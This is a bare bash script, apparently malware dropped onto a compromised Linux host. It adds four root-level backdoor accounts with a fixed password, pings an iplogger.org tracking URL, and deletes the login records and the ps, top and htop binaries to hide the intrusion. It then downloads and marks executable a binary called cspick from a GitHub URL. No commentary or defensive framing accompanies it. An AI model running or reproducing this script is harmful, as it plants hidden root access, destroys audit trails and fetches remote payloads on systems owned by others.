#!/bin/bash
echo 'lolcat:x:0:0:lolcat:/root:/bin/bash' >> /etc/passwd
echo 'lolcat:123:18020:0:99999:7:::' >> /etc/shadow
echo 'lolcat:free08' | chpasswd

echo 'local:x:0:0:local:/root:/bin/bash' >> /etc/passwd
echo 'local:123:18020:0:99999:7:::' >> /etc/shadow
echo 'local:free08' | chpasswd

echo 'vnc:x:0:0:vnc:/root:/bin/bash' >> /etc/passwd
echo 'vnc:123:18020:0:99999:7:::' >> /etc/shadow
echo 'vnc:free08' | chpasswd

echo 'xtmp:x:0:0:vnc:/root:/bin/bash' >> /etc/passwd
echo 'xtmp:123:18020:0:99999:7:::' >> /etc/shadow
echo 'xtmp:free08' | chpasswd

wget --delete-after -q --no-check-certificate https://iplogger.org/2fE227 >/dev/null 2>&1; 
rm -rf  /var/log/wtmp    
rm -rf  /var/run/utmp    
rm -rf  /var/log/btmp 
rm -rf  /var/log/lastlog
rm -rf /usr/bin/ps
rm -rf /usr/bin/top
rm -rf /usr/bin/htop
rm -rf  rss.sh
rm -rf cspick
wget -q --no-check-certificate https://github.com/Alemalakraa/sd/raw/main/cspick
chmod 777 cspick
